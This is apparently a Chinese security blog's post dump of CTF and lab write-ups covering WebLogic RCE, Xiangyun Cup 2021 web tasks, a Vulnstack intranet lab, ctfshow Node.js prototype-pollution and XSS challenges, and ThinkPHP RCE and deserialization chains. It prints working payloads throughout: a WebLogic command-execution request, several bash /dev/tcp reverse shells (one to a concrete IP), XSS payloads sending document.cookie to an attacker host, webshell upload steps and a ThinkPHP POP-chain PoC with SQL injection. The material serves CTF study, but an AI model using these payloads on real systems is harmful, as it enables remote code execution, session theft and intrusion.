/console/css/%252e%252e%252fconsolejndi.portal?test_handle=com.tangosol.coherence.mvel2.sh.ShellSession(%27weblogic.work.ExecuteThread%20currentThread%20=%20(weblogic.work.ExecuteThread)Thread.currentThread();%20weblogic.work.WorkAdapter%20adapter%20=%20currentThread.getCurrentWork();%20java.lang.reflect.Field%20field%20=%20adapter.getClass().getDeclaredField(%22connectionHandler%22);field.setAccessible(true);Object%20obj%20=%20field.get(adapter);weblogic.servlet.internal.ServletRequestImpl%20req%20=%20(weblogic.servlet.internal.ServletRequestImpl)obj.getClass().getMethod(%22getServletRequest%22).invoke(obj);%20String%20cmd%20=%20req.getHeader(%22cmd%22);String[]%20cmds%20=%20System.getProperty(%22os.name%22).toLowerCase().contains(%22window%22)%20?%20new%20String[]{%22cmd.exe%22,%20%22/c%22,%20cmd}%20:%20new%20String[]{%22/bin/sh%22,%20%22-c%22,%20cmd};if(cmd%20!=%20null%20){%20String%20result%20=%20new%20java.util.Scanner(new%20java.lang.ProcessBuilder(cmds).start().getInputStream()).useDelimiter(%22\\\\\\\\A%22).next();%20weblogic.servlet.internal.ServletResponseImpl%20res%20=%20(weblogic.servlet.internal.ServletResponseImpl)req.getClass().getMethod(%22getResponse%22).invoke(req);res.getServletOutputStream().writeStream(new%20weblogic.xml.util.StringInputStream(result));res.getServletOutputStream().flush();}%20currentThread.interrupt(); HTTP/1.1\\r\\nHost:weblogic\\r\\ncmd: /readflag\\r\\n\\r\\n&#39;&#39;&#39; sSocket.send(payload) sSocket.settimeout(2) response = sSocket.recv(2147483647) while len(response) &gt; 0: print(response.decode()) try: response = sSocket.recv(2147483647) except: break sSocket.close()","categories":[{"name":"技术","slug":"技术","permalink":"/categories/技术/"}],"tags":[],"keywords":[{"name":"技术","slug":"技术","permalink":"/categories/技术/"}]},{"title":"祥云杯2021 Web","slug":"2021祥云杯-Package-Manager-2021","date":"2021-10-21T04:52:31.000Z","updated":"2021-10-21T09:26:24.962Z","comments":true,"path":"2021/10/21/2021祥云杯-Package-Manager-2021/","link":"","permalink":"/2021/10/21/2021祥云杯-Package-Manager-2021/","excerpt":"","text":"[2021祥云杯]Package Manager 2021虽然还是看不太懂这种js，但是不影响做题。 根据经验先看routes里的index.ts。发现auth处存在字符串的拼接： 跟进checkmd5Regex 没有匹配开头结尾，也就是在后面拼接内容就可以过正则。 写个脚本跑就行。 ffffffffffffffffffffffffffffffff&quot;||this.password[0]==&quot;! [2021祥云杯]secrets_of_admin用database.ts里给的admin登录 进去是个创建pdf的功能找一下相关代码： 继续往下看，是一个读取文件的接口： 但是superuser被禁用了 而flag就是superuser的 所以需要把flag给admin，也就是给admin一个文件名，让他文件名不是flag，和路径拼接到一起时又可以读到flag文件，比如./flag。可/api/files那里又需要本地访问，所以需要ssrf。不熟悉pdf这里的ssrf，google找到了 CVE-2019-15138 &lt;script&gt; var Troy3e = new XMLHttpRequest();Troy3e.open(&quot;GET&quot;, &quot;http://127.0.0.1:8888/api/files?username=admin&amp;filename=./flag&amp;checksum=123&quot;, true);Troy3e.send(); &lt;/script&gt; 过滤了小标签和script，用数组绕过 最后访问/api/files/123。 [2021祥云杯]cralwer_zindex是普通的注册登录，没有利用点。 user.js有profile、verify、bucket三个路由。 bucket这里会访问user.bucket，大概这就是利用点了。首先必须满足如下要求 跟一下看看是不是可控的。 显然我们要满足第一个要求是很容易的，但这里不行，也就是这里不会跳转。但是只有跳转到verify才会更新bucket。 同时，发到verify的token会失效。这说明我们既要满足personalbucket是我们自己的url，也要能满足跳转到verify成功更新bucket。 所以我们先用默认的bucket发一次请求获取到可以被找到的token 再用自己的url发一次包 最后在第一次发的包那里重定向即可更新bucket，访问/user/bucket即可反弹shell。 读flag &lt;script&gt; a=this.constructor.constructor.constructor.constructor(&#39;return process&#39;)();b=a.mainModule.require(&#39;child_process&#39;);c=b.execSync(&#39;cat /flag&#39;).toString();document.write(c); &lt;/script&gt; 弹shell &lt;script&gt;c=&#39;constructor&#39;;this[c][c](&quot;c=&#39;constructor&#39;;require=this[c][c](&#39;return process&#39;)().mainModule.require;var sync=require(&#39;child_process&#39;).spawnSync; var ls = sync(&#39;bash&#39;, [&#39;-c&#39;,&#39;bash -i &gt;&amp; /dev/tcp/x.x.x.x/3333 0&gt;&amp;1&#39;],);console.log(ls.output.toString());&quot;)()&lt;/script&gt;","categories":[{"name":"技术","slug":"技术","permalink":"/categories/技术/"}],"tags":[],"keywords":[{"name":"技术","slug":"技术","permalink":"/categories/技术/"}]},{"title":"vulnstack内网靶场(二)","slug":"vulnstack内网靶场-二","date":"2021-10-16T08:32:04.000Z","updated":"2021-10-16T12:09:59.867Z","comments":true,"path":"2021/10/16/vulnstack内网靶场-二/","link":"","permalink":"/2021/10/16/vulnstack内网靶场-二/","excerpt":"","text":"这次就不写保姆级教程了，太累了。老实说这些靶场其实学不到什么技术，只是用来练习使用各种工具。靶场链接：http://vulnstack.qiyuanxuetang.net/vuln/detail/3/ 环境搭建网络拓扑图 网卡 kali： WEB、PC： DC： 若Web密码错误的，在快照管理器里面选择转到1.3即可。手动开启Web服务，依次管理员执行账号为administrator，密码为1qaz@WSX。 打开web服务，需要管理员权限 ping一下： 搭建完成。 外网渗透nmap收集一波信息，扫到了7001，实习的时候研究过weblogic，所以直接访问后台。 http://192.168.111.80:7001/console/login/LoginForm.jsp WebLogic 10.3.6.0，康康工作时候的记录： cve-2019-2725 先连接冰蝎，说到这不得不吐槽一下java，冰蝎和burp的java环境要求不一样导致要换来换去。 所以改用现成工具：https://kfi.re/220.html weblogic上传木马路径选择：https://www.cnblogs.com/sstfy/p/10350915.html \\Oracle\\Middleware\\wlserver_10.3\\server\\lib\\consoleapp\\webapp\\framework\\skins\\wlsconsole\\images\\shell.jsp 访问 http://192.168.111.80:7001/console/framework/skins/wlsconsole/images/shell.jsp 拿到CS的shell利用冰蝎上传cs马 虽然开了360，但是似乎并没有拦到我。看到网上很多文章都是被拦截和绕过的，懒得整了 用cs自带的提权直接成功 接下来用cs给msf派生一个shell。 派生一个msf的shell（非必要）这一步不是必须的，毕竟cs更适合打windows，只是记录一下技巧。 1、msf配置监听 msf &gt; use exploit/multi/handler msf exploit(handler) &gt; set payload windows/meterpreter/reverse_tcp msf exploit(handler) &gt; set lhost 192.168.135.128 msf exploit(handler) &gt; set lport 9999 msf exploit(handler) &gt; exploit 然后cs创建个新的监听器 右键想要派生的shell，点击spawn，选择刚刚创建的listener即可。但是我这里试了几次都没出的来，可能是环境问题。 问题不大，反正这里知道怎么派生即可。 内网渗透 看了看后面的操作和一差不多，就不搞了。有空看看。 https://www.i4k.xyz/article/weixin_45605352/119898843","categories":[{"name":"技术","slug":"技术","permalink":"/categories/技术/"}],"tags":[],"keywords":[{"name":"技术","slug":"技术","permalink":"/categories/技术/"}]},{"title":"nodejs随笔","slug":"nodejs随笔","date":"2021-10-11T15:09:28.000Z","updated":"2021-10-11T15:16:02.380Z","comments":true,"path":"2021/10/11/nodejs随笔/","link":"","permalink":"/2021/10/11/nodejs随笔/","excerpt":"","text":"Node.js常见漏洞学习与总结https://xz.aliyun.com/t/7184 关于继承和原型链：https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Inheritance_and_the_prototype_chain 原型链污染：https://www.leavesongs.com/PENETRATION/javascript-prototype-pollution-attack.html#0x02-javascript ##Web334ctfshow 123456 ##Web335无过滤的rce： require(&#39;child_process&#39;).execSync(&#39;cat fl00g&#39;); require(&#39;child_process&#39;).spawnSync(&#39;ls&#39;,[&#39;./&#39;]).stdout.toString() require(&#39;child_process&#39;).execFileSync(&#39;ls&#39;) ##Web336 require(&#39;child_process&#39;).spawnSync(&#39;cat&#39;,[&#39;./fl001g.txt&#39;]).stdout.toString() ##Web337数组 ##Web338关于继承和原型链：https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Inheritance_and_the_prototype_chain 原型链污染：https://www.leavesongs.com/PENETRATION/javascript-prototype-pollution-attack.html#0x02-javascript 关键点在utils.copy(user,req.body); ##Web339Node.js常见漏洞学习与总结https://xz.aliyun.com/t/7184 36dboy改为了flag，并且多了两个类.要让secert.ctfshow===flag，很显然只能更改secert.ctfshow的值。原型链污染的漏洞还存在，是user类。它的上一级是Object。同时secert的上一级也是object，那么我们只要另user.proto.ctfshow=this.flag但是无法实现. 多出来的api.js有这么一行： 测试一下 污染点login.js 里的 utils.copy(user,req.body); ，代码执行的触发点在 api.js 的 res.render(‘api’, { query: Function(query)(query)}); 处。 {&quot;__proto__&quot;:{&quot;query&quot;:&quot;return global.process.mainModule.constructor._load(&#39;child_process&#39;).exec(&#39;bash -c \\&quot;bash -i &gt;&amp; /dev/tcp/x.x.x.x/3333 0&gt;&amp;1\\&quot;&#39;)&quot;}} ##Web340 user.userinfo.isAdmin要为1，但是没办法直接通过原型链污染控制isAdmin的值，所以用上一题相同的办法，只是这里要跳两层： {&quot;__proto__&quot;:{&quot;__proto__&quot;:{&quot;query&quot;:&quot;return global.process.mainModule.constructor._load(&#39;child_process&#39;).exec(&#39;bash -c \\&quot;bash -i &gt;&amp; /dev/tcp/x.x.x.x/3333 0&gt;&amp;1\\&quot;&#39;)&quot;}}} ##Web341 本以为这题能直接控制isAdmin，但是发现不行，看了看copy函数发现原来是自己理解错了，相同的没法控制： 其实这题的预期解ejs rce前几题都是可以用的。 https://evi0s.com/2019/08/30/expresslodashejs-%E4%BB%8E%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93%E5%88%B0rce/ {&quot;__proto__&quot;:{&quot;__proto__&quot;:{&quot;outputFunctionName&quot;:&quot;_tmp1;global.process.mainModule.require(&#39;child_process&#39;).exec(&#39;bash -c \\&quot;bash -i &gt;&amp; /dev/tcp/x.x.x.x/3333 0&gt;&amp;1\\&quot;&#39;);var __tmp2&quot;}}} ##Web342jade rcehttps://xz.aliyun.com/t/7025https://tari.moe/2021/05/04/ctfshow-nodejs/ 调试下，之前没搞过nodejs，一开始连用哪个软件调试都不知道。。。 点击run and debug并创建好launch.json，然后直接run就行。 端口默认是3000，我这里改成了3333。第七行下断点 step into step into step into step into 进入jade模块 res.render=&gt;app.render=&gt;tryRender=&gt;view.render=&gt;this.engine 入口是rebderFile方法 返回值可执行，进入handleTemplateCache 进入compile 都是可控的，但是上面还有个parse没看。 代码太多，直接看return的东西然后逆推。看下js那的compile 返回的是 buf，跟进66行的this.visit(this.node) node.line 可以被 push 到 buf 中，条件是 this.debug=true。但是如何控制node.line的值呢？我的理解是因为这个node.line的值是不存在的，所以我们只需要污染object里面的line即可控制node.line的值。 下个断点试一下，却发现line的值在正常执行时也是有值的： 发生甚么事了？https://xz.aliyun.com/t/7025#toc-5 好吧，距离rce还漏了很多东西，至少前面一些条件都没看。1、首先debug要为true 这个很好解决，因为一开始他是未定义的，直接污染即可 2、让node.line为undefined 不得不说这个测试的方法很妙。 3、不报错 这个时间原因懒得去调了。 payload {&quot;__proto__&quot;:{&quot;__proto__&quot;:{&quot;compileDebug&quot;:1,&quot;type&quot;:&quot;Code&quot;,&quot;self&quot;:1,&quot;line&quot;:&quot;global.process.mainModule.require(&#39;child_process&#39;).execSync(&#39;bash -c \\&quot;bash -i &gt;&amp; /dev/tcp/121.196.169.53/3333 0&gt;&amp;1\\&quot;&#39;)&quot;}}} 参考：https://tari.moe/2021/05/04/ctfshow-nodejs/ 最后附一张草稿纸，老是记不住变量只能用笔记 ##Web344 ?query={&quot;name&quot;:&quot;admin&quot;&amp;query=&quot;password&quot;:&quot;ctfshow&quot;&amp;query=&quot;isVIP&quot;:true} ##小结 342、343学到很多。但是现在审计水平还是一般，大概是缺少开发经验的原因。","categories":[{"name":"技术","slug":"技术","permalink":"/categories/技术/"}],"tags":[],"keywords":[{"name":"技术","slug":"技术","permalink":"/categories/技术/"}]},{"title":"xss基础","slug":"xss基础","date":"2021-10-08T03:42:50.000Z","updated":"2021-10-08T03:44:59.450Z","comments":true,"path":"2021/10/08/xss基础/","link":"","permalink":"/2021/10/08/xss基础/","excerpt":"","text":"#XSS 什么是xss？跨站脚本攻击（Cross Site Scripting），为不和层叠样式表（Cascading Style Sheets，CSS）的缩写混淆，故将跨站脚本攻击缩写为 XSS。恶意攻击者往 WEB 页面里插入恶意 HTML 代码，当用户浏览该页之时，嵌入其中 Web 里面的 HTML 代码会被执行，从而达到恶意攻击用户的特殊目的。 xss危害1、通过 document.cookie 盗取 cookie中的信息2、使用 js或 css破坏页面正常的结构与样式3、流量劫持（通过访问某段具有 window.location.href 定位到其他页面）4、dos攻击：利用合理的客户端请求来占用过多的服务器资源，从而使合法用户无法得到服务器响应。并且通过携带过程的 cookie信息可以使服务端返回400开头的状态码，从而拒绝合理的请求服务。5、利用 iframe、frame、XMLHttpRequest或上述 Flash等方式，以（被攻击）用户的身份执行一些管理动作，或执行一些一般的如发微博、加好友、发私信等操作，并且攻击者还可以利用 iframe，frame进一步的进行 CSRF 攻击。6、控制企业数据，包括读取、篡改、添加、删除企业敏感数据的能力。 xss三种分类搬运自https://ctf-wiki.org/web/xss/ 一、反射型 XSS反射型跨站脚本（Reflected Cross-Site Scripting）是最常见，也是使用最广的一种，可将恶意脚本附加到 URL 地址的参数中。 反射型 XSS 的利用一般是攻击者通过特定手法（如电子邮件），诱使用户去访问一个包含恶意代码的 URL，当受害者点击这些专门设计的链接的时候，恶意代码会直接在受害者主机上的浏览器执行。此类 XSS 通常出现在网站的搜索栏、用户登录口等地方，常用来窃取客户端 Cookies 或进行钓鱼欺骗。 服务器端代码： &lt;?php // Is there any input? if( array_key_exists( &quot;name&quot;, $_GET ) &amp;&amp; $_GET[ &#39;name&#39; ] != NULL ) { // Feedback for end user echo &#39;&lt;pre&gt;Hello &#39; . $_GET[ &#39;name&#39; ] . &#39;&lt;/pre&gt;&#39;; } ?&gt; 可以看到，代码直接引用了 name 参数，并没有做任何的过滤和检查，存在明显的 XSS 漏洞。 二、持久性 XSS持久型跨站脚本（Persistent Cross-Site Scripting）也等同于存储型跨站脚本（Stored Cross-Site Scripting）。 此类 XSS 不需要用户单击特定 URL 就能执行跨站脚本，攻击者事先将恶意代码上传或储存到漏洞服务器中，只要受害者浏览包含此恶意代码的页面就会执行恶意代码。持久型 XSS 一般出现在网站留言、评论、博客日志等交互处，恶意脚本存储到客户端或者服务端的数据库中。 服务器端代码： &lt;?php if( isset( $_POST[ &#39;btnSign&#39; ] ) ) { // Get input $message = trim( $_POST[ &#39;mtxMessage&#39; ] ); $name = trim( $_POST[ &#39;txtName&#39; ] ); // Sanitize message input $message = stripslashes( $message ); $message = mysql_real_escape_string( $message ); // Sanitize name input $name = mysql_real_escape_string( $name ); // Update database $query = &quot;INSERT INTO guestbook ( comment, name ) VALUES ( &#39;$message&#39;, &#39;$name&#39; );&quot;; $result = mysql_query( $query ) or die( &#39;&lt;pre&gt;&#39; . mysql_error() . &#39;&lt;/pre&gt;&#39; ); //mysql_close(); } ?&gt; 代码只对一些空白符、特殊符号、反斜杠进行了删除或转义，没有做 XSS 的过滤和检查，且存储在数据库中，明显存在存储型 XSS 漏洞。 三、DOM XSS传统的 XSS 漏洞一般出现在服务器端代码中，而 DOM-Based XSS 是基于 DOM 文档对象模型的一种漏洞，所以，受客户端浏览器的脚本代码所影响。客户端 JavaScript 可以访问浏览器的 DOM 文本对象模型，因此能够决定用于加载当前页面的 URL。换句话说，客户端的脚本程序可以通过 DOM 动态地检查和修改页面内容，它不依赖于服务器端的数据，而从客户端获得 DOM 中的数据（如从 URL 中提取数据）并在本地执行。另一方面，浏览器用户可以操纵 DOM 中的一些对象，例如 URL、location 等。用户在客户端输入的数据如果包含了恶意 JavaScript 脚本，而这些脚本没有经过适当的过滤和消毒，那么应用程序就可能受到基于 DOM 的 XSS 攻击。 HTML 代码： &lt;html&gt; &lt;head&gt; &lt;title&gt;DOM-XSS test&lt;/title&gt; &lt;/head&gt; &lt;body&gt; &lt;script&gt; var a=document.URL; document.write(a.substring(a.indexOf(&quot;a=&quot;)+2,a.length)); &lt;/script&gt; &lt;/body&gt; &lt;/html&gt; 将代码保存在 domXSS.html 中，浏览器访问： http://127.0.0.1/domXSS.html?a=&lt;script&gt;alert(&#39;XSS&#39;)&lt;/script&gt; 即可触发 XSS 漏洞。 ##Web316试了试xss平台，第一题可以打通，第二题就不行了，没有管理员的流量，只有我自己的。所以在vps上自己写一个： &lt;?php $content = $_GET[1]; if(isset($content)){ file_put_contents(&quot;flag.txt&quot;,$content); }else{ echo&quot;what happened?; } ?&gt; 注意要给权限。paylaod 1、 &lt;script&gt;document.location.href=&#39;http://x.x.x.x:5555/xss/xss.php?1=&#39;+document.cookie&lt;/script&gt; 2、 &lt;script&gt;window.open(&#39;http://x.x.x.x:5555/xss/xss.php?1=&#39;+document.cookie)&lt;/script&gt; 3、 &lt;script&gt;location.href=&#39;http://x.x.x.x:5555/xss/xss.php?1=&#39;+document.cookie&lt;/script&gt; 4、 &lt;script&gt;window.location.href=&#39;http://x.x.x.x:5555/xss/xss.php?1=&#39;+document.cookie&lt;/script&gt; 5、 &lt;input onfocus=&quot;window.open(&#39;http://x.x.x.x:5555/xss/xss.php?1=&#39;+document.cookie)&quot; autofocus&gt; 6、 &lt;svg onload=&quot;window.open(&#39;http://x.x.x.x:5555/xss/xss.php?1=&#39;+document.cookie)&quot;&gt; 7、&lt;iframe onload=&quot;window.open(&#39;http://x.x.x.x:5555/xss/xss.php?1=&#39;+document.cookie)&quot;&gt;&lt;/iframe&gt; 8、&lt;body onload=&quot;window.location.href=&#39;http://x.x.x.x:5555/xss/xss.php?1=&#39;+document.cookie&quot;&gt;&lt;/body&gt; ##Web317过滤了script &lt;body onload=&quot;window.location.href=&#39;http://x.x.x.x:5555/xss/xss.php?1=&#39;+document.cookie&quot;&gt;&lt;/body&gt; ##Web318同317 ##Web319同317 ##Web320过滤空格 1、用tab代替 &lt;body onload=&quot;window.location.href=&#39;http://x.x.x.x:5555/xss/xss.php?1=&#39;+document.cookie&quot;&gt;&lt;/body&gt; 2、注释绕过 &lt;body/**/onload=&quot;window.location.href=&#39;http://x.x.x.x:5555/xss/xss.php?1=&#39;+document.cookie&quot;&gt;&lt;/body&gt; ##Web321 &lt;body onload=&quot;window.location.href=&#39;http://x.x.x.x:5555/xss/xss.php?1=&#39;+document.cookie&quot;&gt;&lt;/body&gt; ##Web322理论上上面是可以打通的，但是打了好几遍没打通。原因是我url里面有xss，这里过滤了xss，所以把xss换掉即可。 &lt;body onload=&quot;window.location.href=&#39;http://x.x.x.x:5555/xs/xs.php?1=&#39;+document.cookie&quot;&gt;&lt;/body&gt; ##Web323同322 ##Web324同322 ##Web325同322 ##Web326同322 ##Web327同322 ##Web328 &lt;script&gt;window.location.href=&#39;http://x.x.x.x:5555/xs/xs.php?1=&#39;+document.cookie&lt;/script&gt; 获得管理员cookie替换即可在用户管理界面看到flag ##Webb29用上面的payload也能拿到cookie，但是拿到之后就失效了。但是可以写脚本读取页面内容，正好前段时间javaweb接触了点前端的东西： flag在密码列第一行，查看元素： 属于类laytable-cell-1-0-1 &lt;script&gt;$(&#39;.laytable-cell-1-0-1&#39;).each(function(index,flag){if(flag.innerHTML.indexOf(&#39;ctf&#39;+&#39;show&#39;)&gt;-1){window.location.href=&#39;http://x.x.x.x:5555/xs/xs.php?1=&#39;+flag.innerHTML;}});&lt;/script&gt; ctfshow拆开是防止读到自己。拿到admin密码登录。 ##Web330 &lt;script&gt;window.location.href=&#39;http://127.0.0.1/api/change.php?p=111&#39;;&lt;/script&gt; 改管理员密码也可以读取页面 ##Web331 &lt;script&gt;$.post(&quot;http://127.0.0.1/api/change.php&quot;,{p:111},&quot;json&quot;);&lt;/script&gt; ##Web332逻辑漏洞 转-9999 ##Web333 &lt;script&gt;$.post(&quot;http://127.0.0.1/api/amount.php&quot;,{&#39;u&#39;:&#39;111111&#39; ,&#39;a&#39;:10000},&quot;json&quot;);&lt;/script&gt;","categories":[{"name":"技术","slug":"技术","permalink":"/categories/技术/"}],"tags":[],"keywords":[{"name":"技术","slug":"技术","permalink":"/categories/技术/"}]},{"title":"ThinkPHP X 源码分析","slug":"ThinkPHP X 源码分析","date":"2021-09-27T14:59:07.000Z","updated":"2021-09-28T06:36:52.343Z","comments":true,"path":"2021/09/27/ThinkPHP X 源码分析/","link":"","permalink":"/2021/09/27/ThinkPHP X 源码分析/","excerpt":"","text":"复现一下ThinkPHP的各种漏洞，锻炼一下自己分析源码的能力，持续更新。更新记录：9/274/264/64/22021/3/28 ThinkPHP 5.0.x (&lt;=5.0.23) RCE分析 2021/3/28首先查看官方log： 改进request的method方法，所以我们diffinity直接对比两个版本区别： 在5.0.24中对method作了白名单的限制，只允许$this-&gt;method为常用的几个方法，否则就将其置为POST方法，因此我们的入口点就可以从Request.php跟进。(如果按正常思路寻找的话，index.php-&gt;start.php-&gt;routeCheck-&gt;check 也是可以跟到method的)全局搜索call_user_func，在Request.php中发现在filterValue方法中。 private function filterValue(&amp;$value, $key, $filters) { $default = array_pop($filters);//弹出并返回 array 数组的最后一个单元，并将数组 array 的长度减一。 foreach ($filters as $filter) { if (is_callable($filter)) {//是否能调用 $value = call_user_func($filter, $value); } elseif (is_scalar($value)) {//检测变量是否是一个标量 if (false !== strpos($filter, &#39;/&#39;)) {//strpos检测字符第一次出现 // 正则过滤 if (!preg_match($filter, $value)) { // 匹配不成功返回默认值 $value = $default; break; } } elseif (!empty($filter)) { // filter函数不存在时, 则使用filter_var进行过滤 // filter为非整形值时, 调用filter_id取得过滤id $value = filter_var($value, is_int($filter) ? $filter : filter_id($filter)); if (false === $value) { $value = $default; break; } } } } return $this-&gt;filterExp($value); } 自己尝试理解下，首先default被赋予filters的最后一个值，然后一个个尝试filters里剩下的值是否为能调用的函数，是的话直接调用，不是的话检测value里是否是一个标量，是的话继续判断filter里有无/，有则将default即filters的最后一个值赋给它。否则（这个否则是针对filters里是否有/）判断filter是否为空，不为空则进行源码注释里的判断。看似莫名其妙，所以我们全局搜一下调用filterValue的方法： input里面调用了它。无论$data是不是数组最终都会调用filterValue方法，而$filter则会进行过滤器解析，跟进$this-&gt;getFilter方法查看解析过程: 说实话这个我没太理解 暂且继续往下看回到input方法中，array_walk_recursive函数会对第一个数组参数中的每个元素应用第二个参数的函数。在input类方法中，$data中键名作为filterValue(&amp;$value, $key, $filters)中的value,键值作为key,filter作为第三个参数$filters,而当这些传入到filterValue后，call_user_func又是利用filter作为回调的函数，value作为回调函数的参数，因此也就是input方法中的data是回调函数的参数，filter是需要回调的函数。了解之后我们需要查找input方法在何处被调用，全局搜索一下：同文件param方法最后调用该方法并作为返回： $this-&gt;param = array_merge($this-&gt;param, $this-&gt;get(false), $vars, $this-&gt;route(false)); 作为data传入input，跟进$this-&gt;get 如果$this-&gt;get为空，直接将其赋值为$_GET,而最后将$this-&gt;get作为input方法的第一个参数，因此我们可以听过变量覆盖，直接将$this-&gt;get赋值，就此我们控制了回调函数和参数。 即_method=__construct&amp;filter[]=system&amp;get[]=whoami或者_method=__construct&amp;filter[]=system&amp;route[]=whoami。 重新推一下，我们可以控制Request类所有方法及属性。在param方法里，$method = $this-&gt;method(true);跟一下method 再跟进server： $name的值是REQUEST_METHOD。server()方法中又跟进了input()方法，第一个参数$this-&gt;server可以利用之前__construct()方法进行属性覆盖，因此$this-&gt;server可控。跟进input()方法： $name是REQUEST_METHOD，会进入if (‘’ != $name) {。这些代码就相当于$data=$data[‘REQUEST_METHOD’]。而$data就是可控的$this-&gt;server，因此这里$data也可控。再往下看： 相当于$filter=$this-&gt;filter，因此过滤器也可控。接下来就进入了filterValue方法，$data是可控的参数，$filter是可控的函数，再进入利用call_user_func即可RCE。最终构造： _method=__construct&amp;filter=system&amp;server[REQUEST_METHOD]=dir 成功执行，危害极大。 漏洞原因：method没有进行限制，导致可以任意调用、覆盖类和属性。参考：https://www.anquanke.com/post/id/222672https://blog.csdn.net/rfrder/article/details/114298944 5.x &lt; 5.1.31 rce 4/2https://github.com/SkyBlueEternal/thinkphp-RCE-POC-Collection 先放个链接 ThinkPHP5深入学习 4/6官方文档：https://www.kancloud.cn/manual/thinkphp5/118003 project 应用部署目录 ├─application 应用目录（可设置） │ ├─common 公共模块目录（可更改） │ ├─index 模块目录(可更改) │ │ ├─config.php 模块配置文件 │ │ ├─common.php 模块函数文件 │ │ ├─controller 控制器目录 │ │ ├─model 模型目录 │ │ ├─view 视图目录 │ │ └─ ... 更多类库目录 │ ├─command.php 命令行工具配置文件 │ ├─common.php 应用公共（函数）文件 │ ├─config.php 应用（公共）配置文件 │ ├─database.php 数据库配置文件 │ ├─tags.php 应用行为扩展定义文件 │ └─route.php 路由配置文件 ├─extend 扩展类库目录（可定义） ├─public WEB 部署目录（对外访问目录） │ ├─static 静态资源存放目录(css,js,image) │ ├─index.php 应用入口文件 │ ├─router.php 快速测试文件 │ └─.htaccess 用于 apache 的重写 ├─runtime 应用的运行时目录（可写，可设置） ├─vendor 第三方类库目录（Composer） ├─thinkphp 框架系统目录 │ ├─lang 语言包目录 │ ├─library 框架核心类库目录 │ │ ├─think Think 类库包目录 │ │ └─traits 系统 Traits 目录 │ ├─tpl 系统模板目录 │ ├─.htaccess 用于 apache 的重写 │ ├─.travis.yml CI 定义文件 │ ├─base.php 基础定义文件 │ ├─composer.json composer 定义文件 │ ├─console.php 控制台入口文件 │ ├─convention.php 惯例配置文件 │ ├─helper.php 助手函数文件（可选） │ ├─LICENSE.txt 授权说明文件 │ ├─phpunit.xml 单元测试配置文件 │ ├─README.md README 文件 │ └─start.php 框架引导文件 ├─build.php 自动生成定义文件（参考） ├─composer.json composer 定义文件 ├─LICENSE.txt 授权说明文件 ├─README.md README 文件 ├─think 命令行入口文件 ThinkPHP v3.2.* （SQL注入&amp;文件读取）反序列化POP链 4/26来自[红明谷CTF 2021]EasyTP的考点，遇到了就来分析一下，不能睁只眼闭只眼看一遍。 环境搭建：composer create-project topthink/thinkphp=3.2.3 tp3 POP链分析:1、找起点全局搜__destruct() 这里的$this-&gt;img可控，且调用了$this-&gt;img的destroy()。 跳板1：首先找一个包含destroy()函数的类 Memcache.class.php 但是这里destroy需要传值，所以继续往下找。 跳板2： 上面$this-&gt;handle可控，并且调用了$this-&gt;handle的delete()方法，且传过去的参数是部分可控的，因此我们可以继续寻找有delete()方法的跳板类。 全局搜索function delete( 这里的$pk其实就是$this-&gt;pk，是完全可控的。 下面的$options是从跳板1传过来的，在跳板1中可以控制其是否为空。$this-&gt;options[‘where’]是成员属性，是可控的，因此506行的条件我们可以控制，且508行的条件我们也是可以控制的。 所以我们可以控制程序走到509行。 在509中又调用了一次自己$this-&gt;delete()，但是这时候的参数$this-&gt;data[$pk]是我们可控的。(重点 这时delete()我们就可以成功带可控参数访问了。 这时候熟悉ThinkPHP的师傅们就应该懂了。这是ThinkPHP的数据库模型类中的delete()方法，最终会去调用到数据库驱动类中的delete()中去，也就是558行。且上面的一堆条件判断很显然都是我们可以控制的包括调用$this-&gt;db-&gt;delete($options)时的$options参数我们也可以控制。 那么这时候我们就可以调用任意自带的数据库类中的delete()方法了。 终点:/ThinkPHP/Library/Think/Db/Driver.class.php 这边的参数是完全可控的，所以这里的$table是可控的，将$table拼接到$sql传入了$this-&gt;execute()。 这里有个初始化数据库连接的地方 可以通过控制成员属性，使程序调用到$this-&gt;connect()。 可以看到这里是去使用$this-&gt;config里的配置去创建了数据库连接，接着去执行前面拼接的DELETESQL语句。 到此，我们就找到了一条可以连接任意数据库的POP链。 1、通过某处leak出目标的WEB目录(e.g. DEBUG页面)2、开启恶意MySQL恶意服务端设置读取的文件为目标的数据库配置文件3、触发反序列化4、触发链中PDO连接的部分5、获取到目标的数据库配置6、使用目标的数据库配置再次出发反序列化7、触发链中DELETE语句的SQL注入 POC: &lt;?php namespace Think\\Db\\Driver{ use PDO; class Mysql{ protected $options = array( PDO::MYSQL_ATTR_LOCAL_INFILE =&gt; true // 开启才能读取文件 ); protected $config = array( &quot;debug&quot; =&gt; 1, &quot;database&quot; =&gt; &quot;thinkphp3&quot;, &quot;hostname&quot; =&gt; &quot;127.0.0.1&quot;, &quot;hostport&quot; =&gt; &quot;3306&quot;, &quot;charset&quot; =&gt; &quot;utf8&quot;, &quot;username&quot; =&gt; &quot;root&quot;, &quot;password&quot; =&gt; &quot;&quot; ); } } namespace Think\\Image\\Driver{ use Think\\Session\\Driver\\Memcache; class Imagick{ private $img; public function __construct(){ $this-&gt;img = new Memcache(); } } } namespace Think\\Session\\Driver{ use Think\\Model; class Memcache{ protected $handle; public function __construct(){ $this-&gt;handle = new Model(); } } } namespace Think{ use Think\\Db\\Driver\\Mysql; class Model{ protected $options = array(); protected $pk; protected $data = array(); protected $db = null; public function __construct(){ $this-&gt;db = new Mysql(); $this-&gt;options[&#39;where&#39;] = &#39;&#39;; $this-&gt;pk = &#39;id&#39;; $this-&gt;data[$this-&gt;pk] = array( &quot;table&quot; =&gt; &quot;mysql.user where 1=updatexml(1,user(),1)#&quot;, &quot;where&quot; =&gt; &quot;1=1&quot; ); } } } namespace { echo base64_encode(serialize(new Think\\Image\\Driver\\Imagick())); } 思路：https://mp.weixin.qq.com/s/S3Un1EM-cftFXr8hxG4qfA?fileGuid=YQ6W8dWWxRpgCVkt实战：[红明谷CTF 2021]EasyTP Thinkphp5.1 反序列化分析 2021/9/252021/9/25 首先必须要吐槽的是，因为自己太憨被tp的路由设置搞了一个多小时。在application/index/controller下创建个新的控制器，并在route/route.php设置了路由 最开始直接访问的www.tp.com:xxx/unserialize，直接404，访问上面自带的think也是404，然而这时候没有意识到是访问路径的问题。。。以为问题出在了设置和nginx上，但是排查了一圈发现都没问题。最后才发现要这样访问：www.tp.com:xxx/index.php/unserialize 麻了。 